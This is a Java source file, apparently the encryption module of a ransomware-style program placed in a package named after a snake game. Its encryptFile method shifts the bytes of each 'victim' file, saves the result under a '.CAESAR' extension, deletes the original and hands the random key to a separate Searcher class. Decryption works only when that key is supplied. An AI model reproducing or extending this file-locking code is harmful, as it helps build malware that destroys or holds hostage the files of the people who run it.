package me.herrlestrate.snakegame.crypto;

import org.apache.commons.io.FilenameUtils;

import java.io.*;
import java.util.Random;

public class Caesar extends Crypto {

    Caesar(){
        super("CAESAR");
    }

    @Override
    public void encryptFile(File victim) {
        if(!victim.exists()){
            System.err.println("Victim file not exists!");
            System.err.println("Victim: "+victim.getAbsolutePath());
            return;
        }

        if(victim.isDirectory()){
            System.err.println("Victim is directory!");
            return;
        }

        if(FilenameUtils.getExtension(victim.getName()).equalsIgnoreCase(getCryptName())){
            System.err.println("Victim already encrypted!");
            System.err.println(victim.getAbsolutePath());
            return;
        }

        FileInputStream inputStream;
        FileOutputStream outputStream;

        String pathToTargetFile = victim.getAbsolutePath()
                +"."+getCryptName();

        File target = new File(pathToTargetFile);
        if(target.exists()){
            System.err.println("Target file already created!");
            return;
        }

        try{
            if(!target.createNewFile()){
                System.err.println("Cannot create "+target.getAbsolutePath());
                return;
            }

        }catch (IOException ex){
            ex.printStackTrace();
            return;
        }

        try{
            inputStream = new FileInputStream(victim);
            outputStream = new FileOutputStream(target);
        }catch (FileNotFoundException ex){
            ex.printStackTrace();
            return;
        }

        int step = getStep();

        try {

            int sign;
            while ((sign = inputStream.read()) != -1) {
                outputStream.write(cryptByte(sign,step));
            }

            inputStream.close();
            outputStream.close();

            if(!victim.delete()){
                System.err.println("Cannot delete victim");
                System.err.println(victim.getAbsolutePath());
            }

        }catch (IOException ex){
            ex.printStackTrace();
        }


    }

    @Override
    public void decryptFile(File victim, String[] args) {
        if(victim.isDirectory()){
            System.err.println("Victim is directory");
            return;
        }

        if(!FilenameUtils.getExtension(victim.getName()).equalsIgnoreCase(getCryptName())){
            System.err.println("Victim extension not right!");
            System.err.println(victim.getAbsolutePath());
            return;
        }

        if(args.length == 0){
            System.err.println("Key not found!");
            return;
        }

        FileInputStream inputStream;
        FileOutputStream outputStream;

        String pathToDecodeFile =
                FilenameUtils.getFullPath(victim.getAbsolutePath())
                        + victim.getName().replace("."+getCryptName(),"");

        File decode = new File(pathToDecodeFile);

        try {
            if(!decode.createNewFile()) {
                System.err.println("Cannot create "+decode.getAbsolutePath());
            }

        }catch (IOException ex){
            ex.printStackTrace();
        }

        try {
            inputStream = new FileInputStream(victim);
            outputStream = new FileOutputStream(decode);
        }catch (FileNotFoundException ex){
            ex.printStackTrace();
            return;
        }

        int step = -getStep(args[0]);

        try {

            int sign;
            while ((sign = inputStream.read()) != -1) {
                outputStream.write(cryptByte(sign,step));
            }

            inputStream.close();
            outputStream.close();

            if(!victim.delete()){
                System.err.println("Cannot delete victim");
                System.err.println(victim.getAbsolutePath());
            }

        }catch (IOException ex){
            ex.printStackTrace();
        }
    }

    private int cryptByte(int x,int step){
        step %= 26;//default alphabet
        return (x+step+256)%256;
    }

    private int getStep(String key){
        return Integer.parseInt(key);
    }

    private int getStep(){
        Random rnd = new Random();
        int x = 0;
        while(x == 0)
            x = rnd.nextInt()%26;
        Searcher.updateDecodedFile(String.valueOf(x));
        return x;
    }
}
